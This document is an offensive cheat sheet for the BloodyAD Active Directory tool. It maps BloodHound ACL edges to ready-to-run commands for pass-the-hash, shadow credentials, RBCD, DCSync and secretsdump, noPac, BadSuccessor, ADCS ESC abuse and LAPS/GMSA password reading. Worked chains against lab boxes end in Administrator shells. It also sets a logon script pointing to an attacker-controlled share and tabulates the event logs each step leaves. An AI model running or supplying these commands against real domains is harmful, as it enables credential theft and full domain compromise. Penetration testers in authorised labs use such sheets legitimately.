---
title: "BloodyAD"
description: "BloodyAD LDAP privilege-abuse toolkit: RBCD, shadow creds, DACL edits, password/attribute writes."
category: active-directory
tags: [active-directory, ldap, acl-abuse]
tools: [BloodyAD]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:ActiveDirectory/BloodyAD.md"
---

# BloodyAD

**BloodyAD** talks **LDAP / LDAPS / SAMR** straight to a DC and turns the ACL edges BloodHound shows you into real actions. This sheet is organised so that when BloodHound-CE shows an edge (GenericAll, GenericWrite, WriteOwner…), you jump to that edge in the ACL Edge Playbook and copy the single command you need.

> **Example lab (swap these five constants) —** `--host 10.10.11.51` (DC) · `-d sequel.htb` (domain) · `-u ryan` (you) · `-p 'Passw0rd!'` (your secret) · targets like `victim`, `ca_svc`, `DC01$`. Every command is written in full.

## 1. Install

```bash
uv tool install bloodyAD
```

```bash
pipx install bloodyAD
```

```bash
git clone https://github.com/CravateRouge/bloodyAD.git && cd bloodyAD && uv pip install .
```

```bash
sudo apt install bloodyad          # Kali / Parrot
```

## 2. Authentication

The auth block precedes every verb. Pick the line that matches your creds.

**Cleartext password:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get writable
```

**Pass-the-Hash (LM blank, leading colon):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p ':32ed87bdb5fdc5e9cba88547376818d4' get writable
```

**Full LM:NT pair:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' get writable
```

**Kerberos with an existing ccache:**

```bash
export KRB5CCNAME=/home/kali/ryan.ccache
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -k get writable
```

**Kerberos, request the TGT from a password:**

```bash
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'Passw0rd!' -k get writable
```

**Kerberos with an AES256 key (`-f aes`):**

```bash
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p '5a4f...aeskey...9c1' -f aes -k get writable
```

**Schannel / certificate (PKINIT if combined with `-k`):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -c 'ryan_key.pem:ryan_cert.pem' get writable
```

**LDAPS (TLS):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' -s get writable
```

**Name won't resolve — pin DC IP and DNS:**

```bash
bloodyAD --host dc01.sequel.htb -i 10.10.11.51 --dns 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get writable
```

| Flag | Meaning |
| :-- | :-- |
| `-H`, `--host` | DC hostname or IP |
| `-d`, `--domain` | Domain FQDN |
| `-u`, `--username` | Username (no domain) |
| `-p`, `--password` | Password, `LMHASH:NTHASH`, Kerberos AES/RC4 key, or cert password |
| `-k`, `--kerberos` | Kerberos (`kdc=`, `ccache=`, `kirbi=`, `keytab=`, cross-realm `realmc=`/`kdcc=`) |
| `-f`, `--format` | `-p`/key format: `b64`, `hex`, `aes`, `rc4`, `default` |
| `-c`, `--certificate` | Schannel / PKINIT, `key.pem:cert.pem` |
| `-s` / `-ss` | LDAPS / strip encryption (debug) |
| `-i`, `--dc-ip` | DC IP when host name won't resolve |
| `--dns` | DNS server (inter-domain) |
| `--gc` | Global Catalog |
| `--json` | JSON output |

> **Warning — Kerberos clock skew.** `-k` throwing `KRB_AP_ERR_SKEW`? Wrap with faketime:
> ```bash
> faketime -f '+7h30m' bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -k get writable
> ```

## 3. Command Model

```text
bloodyAD <auth> <verb> <subcommand> [args]
                  │
                  ├─ get      read AD (object, children, search, writable, membership, dnsDump, trusts)
                  ├─ set      modify (object, owner, password, restore)
                  ├─ add      grant/create (genericAll, groupMember, shadowCredentials, dcsync, rbcd, uac, computer, user, dnsRecord, badSuccessor)
                  ├─ remove   undo any add (cleanup)
                  └─ msldap   low-level ADCS/DACL primitives
```

## 4. Enumeration (get)

**Everything you can write to (start here):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get writable --detail
```

**See which ACEs you hold on a target (Owner / WriteDacl / GenericWrite…):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get object ca_svc --resolve-sd
```

**Read a specific attribute:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get object ryan --attr memberOf
```

**List all users / all computers:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get children 'DC=sequel,DC=htb' --type user
```

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get children 'DC=sequel,DC=htb' --type computer
```

**Recursive group membership:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get membership 'Domain Admins'
```

**Find AS-REP-roastable users (DONT_REQ_PREAUTH):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get search --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' --attr sAMAccountName
```

**Find Kerberoastable users (has SPN):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get search --filter '(&(objectClass=user)(servicePrincipalName=*))' --attr sAMAccountName,servicePrincipalName
```

**Machine Account Quota:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get object 'DC=sequel,DC=htb' --attr ms-DS-MachineAccountQuota
```

**DNS dump / trusts:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get dnsDump
```

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get trusts
```

## 5. ACL Edge Playbook — BloodHound edge → command

> **Tip — How to use this.** In BloodHound-CE, click the edge (or read the outbound-object-control tab). Find that edge name below and copy the block. **Edge supersets:** `Owns` and `WriteOwner` → become the owner → grant yourself anything. `GenericAll` = `GenericWrite` + `WriteDacl` + `WriteOwner` combined, so every attack under those three also works on a GenericAll edge.

### Edge quick index

| BloodHound edge | Fastest win |
| :-- | :-- |
| Owns / WriteOwner | take ownership → GenericAll |
| WriteDacl | grant self GenericAll (or DCSync on domain) |
| GenericAll | shadow creds (user) / RBCD (computer) / add member (group) |
| GenericWrite | targeted Kerberoast / shadow creds / logon script |
| ForceChangePassword | reset the password |
| AddMember / AddSelf | add to the group |
| AddKeyCredentialLink | shadow credentials |
| AddAllowedToAct | RBCD |
| WriteSPN | targeted Kerberoast |
| DCSync (GetChanges/All) | replicate secrets |
| ReadLAPSPassword / ReadGMSAPassword | read the secret (see Credential Access) |

### Owns / WriteOwner

The right to set the object's owner. The owner can always rewrite the DACL, so this becomes full control in two steps.

**1. Take ownership:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set owner ca_svc ryan
```

**2. Grant yourself GenericAll (now do any GenericAll attack below):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add genericAll ca_svc ryan
```

### WriteDacl

The right to edit the DACL. Grant yourself full control, or (on the domain object) DCSync.

**Grant self full control over the object:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add genericAll ca_svc ryan
```

**If the edge is on the DOMAIN object → grant DCSync:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add dcsync ryan
```

### GenericAll

Full control. Superset of GenericWrite + WriteDacl + WriteOwner, so any attack under those works too. Pick by target type.

**On a USER — recover the NT hash via shadow credentials (quiet, reversible):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add shadowCredentials victim
```

**On a USER — reset the password (loud, breaks their logon):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set password victim 'Newpass123!'
```

**On a COMPUTER — configure RBCD (see AddAllowedToAct):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add rbcd 'DC01$' 'ATTACKER$'
```

**On a GROUP — add yourself:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add groupMember 'Domain Admins' ryan
```

> **Tip — GenericAll → GenericWrite.** Since GenericAll includes GenericWrite, you can also do every GenericWrite attack (targeted Kerberoast, logon script) on this same target.

### GenericWrite

Write to (most) attributes, but not the DACL. You can't reset the password, but you can plant an SPN, a Key Credential, or a logon script.

**Targeted Kerberoast — step 1, plant a fake SPN:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object victim servicePrincipalName -v 'HTTP/fake.sequel.htb'
```

**Targeted Kerberoast — step 2, request the TGS:**

```bash
GetUserSPNs.py sequel.htb/ryan:'Passw0rd!' -dc-ip 10.10.11.51 -request-user victim
```

**Targeted Kerberoast — step 3, clear the SPN (cleanup):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object victim servicePrincipalName
```

**Shadow credentials (also available via GenericWrite):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add shadowCredentials victim
```

**Logon-script abuse — payload runs at victim's next interactive logon:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object victim scriptPath -v '\\10.10.14.6\share\run.bat'
```

**Logon-script — revert:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object victim scriptPath
```

**Targeted AS-REP Roast — step 1, set DONT_REQ_PREAUTH:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add uac victim -f DONT_REQ_PREAUTH
```

**Targeted AS-REP Roast — step 2, grab the AS-REP:**

```bash
GetNPUsers.py sequel.htb/victim -no-pass -dc-ip 10.10.11.51 -format hashcat -outputfile asrep.hash
```

**Targeted AS-REP Roast — step 3, unset the flag (cleanup):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' remove uac victim -f DONT_REQ_PREAUTH
```

> **Warning — GenericWrite ≠ password reset.** GenericWrite does **not** include `User-Force-Change-Password`, so you cannot reset the target's password with it. Use shadow credentials or Kerberoast instead. `scriptPath` (logon script) only fires on an **interactive** logon, so it is useless against a service account that never logs on to a desktop.

#### Worked example — GenericWrite on winrm_svc → evil-winrm (HTB Fluffy)

You are in `Service Accounts`, which has GenericWrite over `winrm_svc`. On Fluffy the box has ADCS, so shadow credentials is the clean route to a shell.

**1. Shadow-cred winrm_svc for its NT hash (faketime for the clock skew, DC FQDN for PKINIT):**

```bash
faketime -f '+7h' bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' add shadowCredentials winrm_svc
```

Output:

```text
[+] NT hash via PKINIT: 33bd09dcd697600edf6b3a7af4875767
```

**2. Log in — winrm_svc is in Remote Management Users, so pass-the-hash over WinRM:**

```bash
evil-winrm -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

**Fallback if ADCS were absent — targeted Kerberoast winrm_svc:**

```bash
bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' set object winrm_svc servicePrincipalName -v 'HTTP/fake.fluffy.htb'
```

```bash
GetUserSPNs.py fluffy.htb/p.agila:'prometheusx-303' -dc-ip <DC-IP> -request-user winrm_svc
```

```bash
bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' set object winrm_svc servicePrincipalName
```

Then crack the `$krb5tgs$` with `hashcat -m 13100`. Prefer shadow creds on Fluffy since the service password may not crack.

### ForceChangePassword

The `User-Force-Change-Password` extended right — reset the password without knowing the old one. Same command as a full reset.

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set password victim 'Newpass123!'
```

### AddMember / AddSelf

Write the group's `member` attribute (AddSelf = you may only add yourself).

**Add to the group:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add groupMember 'Domain Admins' ryan
```

**Remove (cleanup):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' remove groupMember 'Domain Admins' ryan
```

### AddKeyCredentialLink

Write `msDS-KeyCredentialLink` → Shadow Credentials → PKINIT → NT hash. Needs PKINIT in the forest (a CA present).

> **Tip — bloodyAD does the WHOLE attack (no Certipy needed).** `add shadowCredentials` adds the Key Credential, performs PKINIT **and** prints the target's NT hash in one command. It also drops a TGT ccache (or a `.pfx` if PKINIT fails) via `--path`. This fully replaces `certipy shadow auto`.

**One command — add key, PKINIT, and print the NT hash:**

```bash
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'Passw0rd!' add shadowCredentials victim
```

Output:

```text
[+] KeyCredential generated with DeviceID ... added to victim
[+] NT hash via PKINIT: a9285c625af80519ad784729655ff325
```

**Save the recovered TGT/pfx to a chosen path:**

```bash
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'Passw0rd!' add shadowCredentials victim --path /tmp/victim
```

**Cleanup — remove the Key Credential afterwards:**

```bash
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'Passw0rd!' remove shadowCredentials victim
```

**Certipy equivalent (only if you prefer it):**

```bash
certipy-ad shadow auto -u ryan@sequel.htb -p 'Passw0rd!' -account victim -dc-ip 10.10.11.51
```

> **Warning — Use the DC FQDN + watch the clock.** PKINIT is Kerberos: pass `--host dc01.sequel.htb` (name, not IP) and, if the DC clock is skewed, prefix `faketime -f '+Xh'`. This is exactly the gotcha on boxes like Fluffy.

#### Worked chain — GenericAll on a group → add self → shadow-cred the members (HTB Fluffy)

You hold **GenericAll over a group** (e.g. `Service Accounts`). Add yourself, which grants you `GenericWrite` over every member, then shadow-cred each service account — all in bloodyAD.

**1. Add yourself to the group (GenericAll → AddMember):**

```bash
bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
```

**2. Shadow-cred the first member (inherited GenericWrite → NT hash):**

```bash
bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' add shadowCredentials winrm_svc
```

**3. Shadow-cred the second member (you'll want ca_svc for the ESC16 step):**

```bash
bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' add shadowCredentials ca_svc
```

> **Note — Why this works.** Group membership is evaluated at authentication. bloodyAD re-authenticates with the password on every call, so step 2/3 already carry the new `Service Accounts` membership (and its GenericWrite over the service users) without any re-login. On Fluffy, wrap each command in `faketime` because of the clock skew.

### AddAllowedToAct (RBCD)

Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target → impersonate anyone to a service on it.

**1. Create a computer you control (needs MAQ > 0):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add computer ATTACKER '$Passw0rd123'
```

**2. Set the RBCD trust on the target:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add rbcd 'DC01$' 'ATTACKER$'
```

**3. Request an impersonation ticket:**

```bash
getST.py -spn cifs/dc01.sequel.htb -impersonate Administrator sequel.htb/ATTACKER$:'$Passw0rd123' -dc-ip 10.10.11.51
```

**4. Cleanup:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' remove rbcd 'DC01$' 'ATTACKER$'
```

### WriteSPN

Write `servicePrincipalName` → targeted Kerberoast. Same three steps as under GenericWrite.

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object victim servicePrincipalName -v 'HTTP/fake.sequel.htb'
```

```bash
GetUserSPNs.py sequel.htb/ryan:'Passw0rd!' -dc-ip 10.10.11.51 -request-user victim
```

### DCSync (GetChanges / GetChangesAll)

Replication rights on the domain — dump any secret.

**Grant yourself DCSync (if you have WriteDacl on the domain):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add dcsync ryan
```

**Replicate secrets:**

```bash
secretsdump.py sequel.htb/ryan:'Passw0rd!'@10.10.11.51
```

**Cleanup:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' remove dcsync ryan
```

## 6. Delegation Attacks

### Unconstrained Delegation

**Set the flag (then coerce a DC and capture its TGT):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add uac 'WEB01$' -f TRUSTED_FOR_DELEGATION
```

### Constrained Delegation (S4U)

**1. Flag the account for protocol transition:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add uac svc_web -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

**2. Set the allowed target SPN:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object svc_web msDS-AllowedToDelegateTo -v 'CIFS/dc01.sequel.htb'
```

**3. Impersonate to the target:**

```bash
getST.py -spn cifs/dc01.sequel.htb -impersonate Administrator sequel.htb/svc_web:'SvcPass1!' -dc-ip 10.10.11.51
```

### Resource-Based Constrained Delegation

See AddAllowedToAct (RBCD) above for the full four-step RBCD flow.

## 7. Credential Access — LAPS & GMSA

**Legacy LAPS (plaintext):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get object 'WKSTN01$' --attr ms-Mcs-AdmPwd
```

**Windows LAPS, unencrypted (JSON in `msLAPS-Password`):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get object 'WKSTN01$' --attr msLAPS-Password
```

**Windows LAPS, encrypted — read the raw blob:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get object 'WKSTN01$' --attr msLAPS-EncryptedPassword
```

**Windows LAPS, encrypted — decrypt with NetExec (needs the GKDI group rights):**

```bash
nxc ldap 10.10.11.51 -u ryan -p 'Passw0rd!' --laps
```

> **Warning — Read ≠ decrypt.** With encrypted Windows LAPS, reading `msLAPS-EncryptedPassword` and decrypting it are separate rights. You must be in the authorised decryption group.

**GMSA managed password — read the blob:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get object 'svc_gmsa$' --attr msDS-ManagedPassword
```

**GMSA — derive the NT hash directly:**

```bash
nxc ldap 10.10.11.51 -u ryan -p 'Passw0rd!' --gmsa
```

## 8. BadSuccessor (dMSA)

> **Warning — Windows Server 2025 dMSA abuse.** `add badSuccessor` creates a Delegated Managed Service Account linked (`msDS-ManagedAccountPrecededByLink`) to inherit a target's privileges. Any principal that can create a child object in an OU can abuse it on vulnerable Server 2025 domains. Check DC OS/patch level.

**Create a dMSA that inherits Administrator:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u lowpriv -p 'Passw0rd!' add badSuccessor evilmsa -t 'CN=Administrator,CN=Users,DC=sequel,DC=htb'
```

**Pin the OU it is created under:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u lowpriv -p 'Passw0rd!' add badSuccessor evilmsa -t 'CN=Administrator,CN=Users,DC=sequel,DC=htb' --ou 'OU=Workstations,DC=sequel,DC=htb'
```

## 9. sAMAccountName Spoofing (noPac)

> **Note — CVE-2021-42278 + CVE-2021-42287.** Create a computer, rename its `sAMAccountName` to a DC's (no `$`), request tickets, rename back — the KDC issues a TGT as the DC.

**1. Create a machine account:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add computer noPacPc 'Passw0rd123!'
```

**2. Clear its SPNs:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object 'noPacPc$' servicePrincipalName
```

**3. Rename to the DC's sAMAccountName:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object 'noPacPc$' sAMAccountName -v 'DC01'
```

**4. Request a TGT as DC01:**

```bash
getTGT.py sequel.htb/DC01:'Passw0rd123!' -dc-ip 10.10.11.51
```

**5. Rename back (avoid collision):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object 'noPacPc$' sAMAccountName -v 'noPacPc'
```

> **Note — Or automate it.** `netexec smb 10.10.11.51 -u ryan -p 'Passw0rd!' -M nopac` runs the whole loop; bloodyAD is the granular fallback.

## 10. AD Recycle Bin — Restore Deleted Objects

**Find deleted user objects:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' get search --base 'DC=sequel,DC=htb' --filter '(&(isDeleted=TRUE)(objectClass=user))' --attr sAMAccountName,lastKnownParent
```

**Restore (reanimate) one:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set restore old_admin
```

## 11. ADCS Setup via bloodyAD (ESC1/ESC4/ESC14)

bloodyAD writes the attributes that *create* the ADCS condition; Certipy exploits it.

**ESC4 → ESC1 — grant enrollment on the template:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' msldap addenrollmentright 'VulnTemplate' 'CN=ryan,CN=Users,DC=sequel,DC=htb'
```

**ESC4 → ESC1 — flip the SAN flag:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' msldap addcerttemplatenameflagaltname 'VulnTemplate' --flags ENROLLEE_SUPPLIES_SUBJECT
```

**ESC4 → ESC1 — request the DA cert with Certipy:**

```bash
certipy-ad req -u ryan@sequel.htb -p 'Passw0rd!' -dc-ip 10.10.11.51 -ca 'SEQUEL-CA' -template 'VulnTemplate' -upn 'administrator@sequel.htb'
```

**ESC14 — write a strong explicit mapping onto a target:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' set object administrator altSecurityIdentities -v 'X509:<I>DC=htb,DC=sequel,CN=SEQUEL-CA<S>CN=ryan'
```

## 12. msldap Low-Level Category

**Raw GenericWrite ACE:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' msldap add_genericwrite 'CN=victim,CN=Users,DC=sequel,DC=htb' 'CN=ryan,CN=Users,DC=sequel,DC=htb'
```

**Raw RBCD write:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' msldap addallowedtoactonbehalfofotheridentity 'CN=DC01,OU=Domain Controllers,DC=sequel,DC=htb' 'S-1-5-21-...-1104'
```

**Add a computer (raw):**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' msldap addcomputer --computername 'ATTACKER$' --computerpass 'Passw0rd123!'
```

**List every msldap function on your version:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' msldap -h
```

## 13. Worked Chains

### WriteOwner → GenericAll → shadow creds (HTB EscapeTwo)

**1. Confirm the edge:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' get object ca_svc --resolve-sd
```

**2. Take ownership:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
```

**3. Grant full control:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan
```

**4. Shadow-cred the NT hash:**

```bash
certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
```

**5. Verify:**

```bash
netexec smb 10.10.11.51 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
```

### GenericAll on DC → RBCD → DA

**1. Create a controlled computer:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add computer ATTACKER '$Passw0rd123'
```

**2. Set RBCD on the DC:**

```bash
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'Passw0rd!' add rbcd 'DC01$' 'ATTACKER$'
```

**3. Impersonate Administrator:**

```bash
getST.py -spn cifs/dc01.sequel.htb -impersonate Administrator sequel.htb/ATTACKER$:'$Passw0rd123' -dc-ip 10.10.11.51
```

**4. Shell:**

```bash
KRB5CCNAME=Administrator@cifs_dc01.sequel.htb@SEQUEL.HTB.ccache psexec.py -k -no-pass sequel.htb/Administrator@dc01.sequel.htb
```

## 14. Command Reference Tables

### Verbs

| Verb | Purpose |
| :-- | :-- |
| `get` | Read AD |
| `set` | Modify attributes / owner / password / restore |
| `add` | Grant rights / create objects |
| `remove` | Undo any `add` |
| `msldap` | Low-level ADCS/DACL primitives |

### add / remove subcommands

| Subcommand | Full example |
| :-- | :-- |
| `genericAll` | `add genericAll ca_svc ryan` |
| `groupMember` | `add groupMember 'Domain Admins' ryan` |
| `shadowCredentials` | `add shadowCredentials victim` |
| `dcsync` | `add dcsync ryan` |
| `rbcd` | `add rbcd 'DC01$' 'ATTACKER$'` |
| `uac` | `add uac victim -f DONT_REQ_PREAUTH` |
| `computer` | `add computer ATTACKER '$Passw0rd123'` |
| `user` | `add user eviluser 'Passw0rd123!'` |
| `dnsRecord` | `add dnsRecord host 10.10.14.6` |
| `badSuccessor` | `add badSuccessor evilmsa -t 'CN=Administrator,...'` |

### set subcommands

| Subcommand | Full example |
| :-- | :-- |
| `password` | `set password victim 'Newpass123!'` |
| `owner` | `set owner ca_svc ryan` |
| `object` | `set object victim scriptPath -v '\\host\share\x.bat'` (omit `-v` to clear) |
| `restore` | `set restore old_admin` |

### UAC flags (`-f`)

| Flag | Use |
| :-- | :-- |
| `DONT_REQ_PREAUTH` | AS-REP roasting |
| `TRUSTED_FOR_DELEGATION` | Unconstrained delegation |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | Constrained delegation (S4U) |
| `DONT_EXPIRE_PASSWD` | Password never expires |
| `ACCOUNTDISABLE` | Disable (`add`) / enable (`remove`) |
| `PASSWD_NOTREQD` | No password required |

### High-value attributes

| Attribute | Meaning |
| :-- | :-- |
| `ms-Mcs-AdmPwd` | Legacy LAPS (plaintext) |
| `msLAPS-Password` | Windows LAPS (plaintext JSON) |
| `msLAPS-EncryptedPassword` | Windows LAPS (DPAPI-NG encrypted) |
| `msDS-ManagedPassword` | GMSA blob (`--raw`) |
| `msDS-AllowedToDelegateTo` | Constrained-delegation targets |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD trust |
| `msDS-KeyCredentialLink` | Shadow Credentials |
| `msDS-ManagedAccountPrecededByLink` | dMSA inheritance (BadSuccessor) |
| `altSecurityIdentities` | Explicit cert mapping (ESC14) |
| `servicePrincipalName` | SPNs (Kerberoast) |
| `scriptPath` | Logon script (GenericWrite) |
| `sAMAccountName` | Rename for noPac |
| `ms-DS-MachineAccountQuota` | Computers a user may create |

## 15. OPSEC & Cleanup

> **Warning — Reverse every change.** Each `add`/`set` has a matching `remove`/restore. Clear planted SPNs, revert UAC flags, `remove dcsync`, `remove rbcd`, `remove shadowCredentials`, delete created computer/user objects, restore `sAMAccountName`/`scriptPath`, remove DNS records.

| Action | Log | Noise |
| :-- | :-- | :-- |
| DACL / owner change | 5136 / 4662 | Medium |
| Shadow-cred write | 5136 (`msDS-KeyCredentialLink`) | Medium |
| Password reset | 4724 / 4738 | High |
| `add dcsync` | 5136 on domain object | High |
| Group change | 4728 / 4729 | Medium |
| Computer creation | 4741 | Medium |
| sAMAccountName rename | 4662 / 4781 | High |

Use `-s` (LDAPS) where allowed so writes aren't in cleartext.

## Sources

- BloodyAD Wiki: https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
- Kali tool page: https://www.kali.org/tools/bloodyad/
- 0xdf — HTB EscapeTwo: https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html
- HackTricks — LAPS: https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html
